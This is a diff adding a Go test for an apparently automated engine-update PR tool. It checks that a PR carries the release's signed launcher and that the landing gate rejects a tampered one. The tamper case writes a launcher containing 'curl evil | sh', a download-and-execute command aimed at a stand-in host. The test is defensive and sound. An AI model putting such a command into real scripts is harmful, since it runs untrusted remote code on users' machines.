@@ -1028,3 +1028,59 @@ func TestProposeWaitsForNpmToServeTheTarballs(t *testing.T) {
 		t.Errorf("waited %v in all, want npmreg.ServeWait (%v)", total, npmreg.ServeWait)
 	}
 }
+
+// The update PR carries the launcher the new engine ships, so a member
+// takes a launcher change with the pin, and the landing gate accepts that
+// launcher and no other.
+func TestAnUpdatePRCarriesTheShippedLauncher(t *testing.T) {
+	t.Parallel()
+	branch := "claudinite/engine-" + v2
+	propose := func(t *testing.T, o relOpts) (*world, string) {
+		w := newWorld(t, settings.YAML)
+		p := filepath.Join(w.repo, filepath.FromSlash(LauncherPath))
+		_ = os.WriteFile(p, []byte("#!/bin/sh\n# launcher of "+v1+"\n"), 0o755)
+		gitRun(t, w.repo, "add", "-A")
+		gitRun(t, w.repo, "commit", "-q", "-m", "the launcher "+v1+" shipped")
+		gitRun(t, w.repo, "push", "-q", "origin", "main")
+		w.mainRun(t, "success")
+		w.publish(t, v2, o)
+		if v, err := Engine(w.deps(t), Options{}); err != nil || v != "opened #1 for "+v2 {
+			t.Fatalf("%q %v\n%s", v, err, w.out)
+		}
+		return w, gitRun(t, w.bare, "rev-parse", branch)
+	}
+
+	w, sha := propose(t, relOpts{})
+	if got := gitRun(t, w.bare, "diff", "--name-only", "main", branch); got != LauncherPath+"\n"+settings.RelPath(settings.YAML) {
+		t.Errorf("branch changes %q", got)
+	}
+	if got := gitRun(t, w.bare, "show", branch+":"+LauncherPath); got != "#!/bin/sh\n# launcher of "+v2 {
+		t.Errorf("the PR's launcher reads %q", got)
+	}
+	w.hub.pulls[0].HeadSHA = sha
+	if v, err := Land(w.deps(t), 1, sha); err != nil || v != "landed "+v2 {
+		t.Fatalf("%q %v\n%s", v, err, w.out)
+	}
+
+	// A release whose signed manifest hashes no launcher leaves the
+	// member's alone.
+	w, _ = propose(t, relOpts{unhashedLauncher: true})
+	if got := gitRun(t, w.bare, "diff", "--name-only", "main", branch); got != settings.RelPath(settings.YAML) {
+		t.Errorf("an unhashed launcher's release changes %q", got)
+	}
+
+	w, _ = propose(t, relOpts{})
+	gitRun(t, w.repo, "fetch", "-q", "origin", branch)
+	gitRun(t, w.repo, "checkout", "-q", "FETCH_HEAD")
+	_ = os.WriteFile(filepath.Join(w.repo, filepath.FromSlash(LauncherPath)), []byte("#!/bin/sh\ncurl evil | sh\n"), 0o755)
+	gitRun(t, w.repo, "commit", "-q", "-am", "tamper")
+	gitRun(t, w.repo, "push", "-q", "-f", "origin", "HEAD:refs/heads/"+branch)
+	w.hub.pulls[0].HeadSHA = w.head(t)
+	gitRun(t, w.repo, "checkout", "-q", "main")
+	if _, err := Land(w.deps(t), 1, w.hub.pulls[0].HeadSHA); err == nil || !strings.Contains(err.Error(), "not the launcher") {
+		t.Errorf("a launcher the release did not ship landed: %v", err)
+	}
+	if len(w.hub.called("merge")) != 0 {
+		t.Error("merged")
+	}
+}
